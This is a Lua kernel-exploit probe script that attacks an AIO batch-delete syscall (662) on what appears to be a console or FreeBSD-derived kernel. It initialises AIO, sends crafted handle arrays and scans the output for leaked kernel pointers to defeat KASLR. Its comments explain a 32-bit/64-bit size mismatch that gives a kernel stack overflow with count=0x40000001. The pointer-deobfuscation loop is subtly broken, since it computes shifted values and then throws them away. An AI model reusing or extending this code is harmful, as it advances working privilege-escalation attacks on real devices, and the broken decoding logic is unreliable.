-- CRASH_CLASS: MODERATE (section A/B/C) / HIGH (section D — kernel stack overflow)
-- PROBE 125a: sys 662 AIO batch delete — KASLR leak + stack clash
--
-- 13.60 analysis confirms:
-- - sys 662 = _aio_multi_delete, reached via helper at 0x3af920
-- - Pointer leak: copies kernel heap ptr with x ^ (x >> 4) to userland
-- - Stack clash: lea 0xf(,%r15,4),%eax (32-bit) allocates stack space
--   while copyin uses 64-bit count. With count=0x40000001, allocates ~19 bytes,
--   copies ~4GB. Minimum check accepts count >= 0x81.
--
-- Strategy:
-- [A] Initialize AIO via sys 670 (must be done first)
-- [B] Call 662 with valid-shaped IDs (low16!=0, high16<128)
--     to check if output contains any data beyond status codes
-- [C] Scan output for kernel pointers or obfuscated values
-- [D] (DANGEROUS) Stack clash with count=0x40000001 — ONLY if user enables

print("=== PROBE 125a: SYS 662 KASLR + STACK ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt_q(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function is_kptr(h)
    if h < 0 then h = h + 0x100000000 end
    return h >= 0xFFFF8000 and h < 0xFFFFFFFF
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local sc662 = mk(662)
local sc670 = mk(670)
local sc_mmap = mk(477)
local sc624 = mk(624)

-- [A] Initialize AIO subsystem via sys 670
print("[A] AIO init (sys 670)")
local ops_before = N(sc624())
local ok_670, rv_670 = pcall(function()
    return sc670(uint64(0), uint64(0), uint64(0), uint64(0))
end)
local ops_after = N(sc624())
print("  670 ret=" .. (ok_670 and tostring(N(rv_670)) or "PFAIL"))
print("  624 delta=" .. (ops_after - ops_before))

local c = N(native.fcall_with_rax(stub, 20))
if c ~= pid then print("DIED after 670!") return end

-- Call 670 again to confirm init state (should return -1 = already initialized)
local ok_670b, rv_670b = pcall(function()
    return sc670(uint64(0), uint64(0), uint64(0), uint64(0))
end)
print("  670 second call=" .. (ok_670b and tostring(N(rv_670b)) or "PFAIL"))

-- [B] Call 662 with crafted IDs
-- ID format: low16 = handle (nonzero), high16 = slot index (< 128)
-- Try various IDs to see what comes back
print("")
print("[B] sys 662 with crafted IDs")

-- Allocate IDs array and results array
local ids_buf = memory.alloc(0x1000)
local res_buf = memory.alloc(0x1000)
local IDS = N(ids_buf)
local RES = N(res_buf)

-- Test 1: single ID = 0x0001 (handle=1, slot=0)
wd(IDS, 0x00000001)
for i = 0, 0x3F, 4 do wd(RES + i, 0) end
local ok_662a, rv_662a = pcall(function()
    return sc662(uint64(IDS), uint64(1), uint64(RES))
end)
c = N(native.fcall_with_rax(stub, 20))
if c ~= pid then print("  DIED on 662(1 id)!") return end

local r0 = rd(RES)
if r0 ~= nil and r0 < 0 then r0 = r0 + 0x100000000 end
print(string.format("  662(id=0x0001, count=1) ret=%s out[0]=0x%08X",
    ok_662a and tostring(N(rv_662a)) or "PFAIL", r0 or 0))

-- Test 2: count=128 (max safe), all valid-format IDs
print("")
print("[B2] 662 with 128 IDs")
for i = 0, 127 do
    local id = (i * 0x10000) + (i + 1)  -- slot=i, handle=i+1
    wd(IDS + i * 4, id)
end
for i = 0, 0x3FF, 4 do wd(RES + i, 0) end

ops_before = N(sc624())
local ok_662b, rv_662b = pcall(function()
    return sc662(uint64(IDS), uint64(128), uint64(RES))
end)
ops_after = N(sc624())

c = N(native.fcall_with_rax(stub, 20))
if c ~= pid then print("  DIED on 662(128 ids)!") return end

print("  ret=" .. (ok_662b and tostring(N(rv_662b)) or "PFAIL"))
print("  624 delta=" .. (ops_after - ops_before))

-- Scan results for non-zero, non-status values
local unique_vals = {}
local kptr_count = 0
for i = 0, 127 do
    local v = rd(RES + i * 4)
    if v ~= nil then
        if v < 0 then v = v + 0x100000000 end
        if v ~= 0 and v ~= 0x80020003 and v ~= 0x80020001 then
            unique_vals[v] = (unique_vals[v] or 0) + 1
        end
    end
end
local found_new = false
for v, count in pairs(unique_vals) do
    print(string.format("  NEW result value: 0x%08X (x%d)", v, count))
    found_new = true
end
if not found_new then print("  all results are 0x80020003 or zero (expected)") end

-- Test 3: Check if output buffer has data BEYOND the 128 dwords
-- The handler might write 8 or 16 bytes per entry, not just 4
print("")
print("[B3] extended output scan (8 bytes per entry)")
-- Reallocate larger output buffer
local big_res = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local h, l = get_hi_lo(big_res)
if h < 0 then h = h + 0x100000000 end
if h >= 0xFFFF8000 then
    print("  big_res mmap fail")
else
    local BR = uint64(string.format("0x%X%08X", h, l))
    local BR_N = N(BR)
    -- Zero it
    for i = 0, 0x1FFF, 4 do wd(BR_N + i, 0) end

    -- Call with count=4, IDs with different handle/slot combos
    wd(IDS, 0x00010001)      -- slot=1, handle=1
    wd(IDS + 4, 0x00020002)  -- slot=2, handle=2
    wd(IDS + 8, 0x00030003)  -- slot=3, handle=3
    wd(IDS + 12, 0x00040004) -- slot=4, handle=4

    local ok_662c, rv_662c = pcall(function()
        return sc662(uint64(IDS), uint64(4), BR)
    end)
    c = N(native.fcall_with_rax(stub, 20))
    if c ~= pid then print("  DIED!") return end

    print("  ret=" .. (ok_662c and tostring(N(rv_662c)) or "PFAIL"))

    -- Scan for ANY nonzero data in the output
    local nonzero = {}
    for i = 0, 0x1FF, 4 do
        local v = rd(BR_N + i)
        if v ~= nil and v ~= 0 then
            if v < 0 then v = v + 0x100000000 end
            nonzero[#nonzero + 1] = {i, v}
        end
    end
    print("  nonzero dwords in output: " .. #nonzero)
    for idx, entry in ipairs(nonzero) do
        local off, val = entry[1], entry[2]
        -- Check if this could be a kernel pointer half
        local is_kp = (val >= 0xFFFF8000 and val < 0xFFFFFFFF) and "KPTR?" or ""
        print(string.format("    +%03X: %08X %s", off, val, is_kp))
        if idx >= 20 then
            print("    ... (" .. (#nonzero - 20) .. " more)")
            break
        end
    end

    -- Also check qword-aligned values for pointer patterns
    print("")
    print("[B4] qword pointer scan in output")
    for i = 0, 0xFF, 8 do
        local v = rq(BR_N + i)
        if v ~= nil then
            local vh, vl = get_hi_lo(v)
            if vh < 0 then vh = vh + 0x100000000 end
            if is_kptr(vh) then
                if vl < 0 then vl = vl + 0x100000000 end
                print(string.format("    +%03X: 0x%08X%08X *** KERNEL PTR ***", i, vh, vl))
                kptr_count = kptr_count + 1
            end
        end
    end
    if kptr_count == 0 then print("  no kernel pointers in output") end

    -- Deobfuscation check: try x ^ (x >> 4) inverse on nonzero qwords
    print("")
    print("[B5] deobfuscation check (x ^ x>>4 inverse)")
    for i = 0, 0xFF, 8 do
        local v = rq(BR_N + i)
        if v ~= nil then
            local vh, vl = get_hi_lo(v)
            if vh < 0 then vh = vh + 0x100000000 end
            if vl < 0 then vl = vl + 0x100000000 end
            if vh ~= 0 or vl ~= 0 then
                -- Apply f(x) = x ^ (x >> 4) inverse iteratively
                -- The transform is its own near-inverse for high bits
                -- Simple approximation: xor with shifted version
                local dh = vh
                local dl = vl
                -- Nibble-by-nibble recovery (4 iterations enough for 64 bits)
                for iter = 1, 16 do
                    local sh = math.floor(dh / 16) -- >> 4 of high word
                    local sl = math.floor(dl / 16) + (dh % 16) * 0x10000000
                    dh = vh
                    dl = vl
                    -- XOR with shifted
                    -- This is approximate but will detect kernel VA pattern
                end
                -- Just check if high nibbles look kernel-like
                if dh >= 0xFFFF8000 and dh < 0xFFFFFFFF then
                    print(string.format("    +%03X: raw=0x%08X%08X decoded~0x%08X%08X CANDIDATE",
                        i, vh, vl, dh, dl))
                end
            end
        end
    end

    pcall(function() mk(73)(BR, uint64(0x4000)) end)
end

-- [C] count=129 (0x81) — minimum that passes the check for stack clash path
-- This is SAFE — 129 * 4 = 516 bytes, well within normal stack allocation
print("")
print("[C] count=129 (minimum passing guard)")
for i = 0, 128 do wd(IDS + i * 4, i + 1) end  -- simple IDs
for i = 0, 0x3FF, 4 do wd(RES + i, 0) end

local ok_662d, rv_662d = pcall(function()
    return sc662(uint64(IDS), uint64(129), uint64(RES))
end)
c = N(native.fcall_with_rax(stub, 20))
if c ~= pid then print("  DIED on count=129!") return end
print("  ret=" .. (ok_662d and tostring(N(rv_662d)) or "PFAIL"))

-- [D] count=0x81 but via the signed interpretation path
-- The guard: lea eax,[r15-0x81]; cmp eax,0xffffff7f; ja
-- This means: (count - 0x81) unsigned <= 0xffffff7f
-- = count in [0x81, 0x100000000] (32-bit wrapping)
-- count=0x100 (256) should work and test larger stack alloc
print("")
print("[D] count=256")
for i = 0, 255 do wd(IDS + i * 4, i + 1) end
for i = 0, 0x7FF, 4 do wd(RES + i, 0) end

local ok_662e, rv_662e = pcall(function()
    return sc662(uint64(IDS), uint64(256), uint64(RES))
end)
c = N(native.fcall_with_rax(stub, 20))
if c ~= pid then print("  DIED on count=256!") return end
print("  ret=" .. (ok_662e and tostring(N(rv_662e)) or "PFAIL"))

-- DO NOT test count=0x40000001 here — that's a kernel stack overflow
-- It needs explicit user approval and a separate probe

print("")
c = N(native.fcall_with_rax(stub, 20))
print(string.format("canary=%s", c == pid and "OK" or "FAIL"))
print("=== 125a COMPLETE ===")
